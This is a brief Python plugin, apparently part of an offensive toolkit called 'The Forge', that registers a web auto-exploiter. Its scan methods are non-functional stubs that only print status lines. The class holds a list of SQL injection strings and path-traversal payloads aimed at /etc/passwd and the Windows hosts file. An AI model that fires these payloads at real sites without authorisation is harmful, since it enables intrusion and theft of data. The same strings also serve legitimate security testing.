"""
The Forge — Web Exploitation Module
Functions: SQLi testing, LFI scanning, Payload dropping
"""

def register(registry):
    registry.register("web_exploiter", WebExploiter, metadata={
        "description": "Auto-exploiter for Web Vulnerabilities (SQLi/LFI)",
        "author": "The Forge API"
    })

class WebExploiter:
    def __init__(self):
        self.payloads = {
            "sqli": ["' OR 1=1 --", "' UNION SELECT NULL--", "admin' --"],
            "lfi": ["../../../../etc/passwd", "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"]
        }

    def scan_sqli(self, url):
        return f"[*] Launching SQLi scan against {url} using {len(self.payloads['sqli'])} payloads..."
        
    def scan_lfi(self, url):
        return f"[*] Launching LFI extraction against {url} using {len(self.payloads['lfi'])} payloads..."
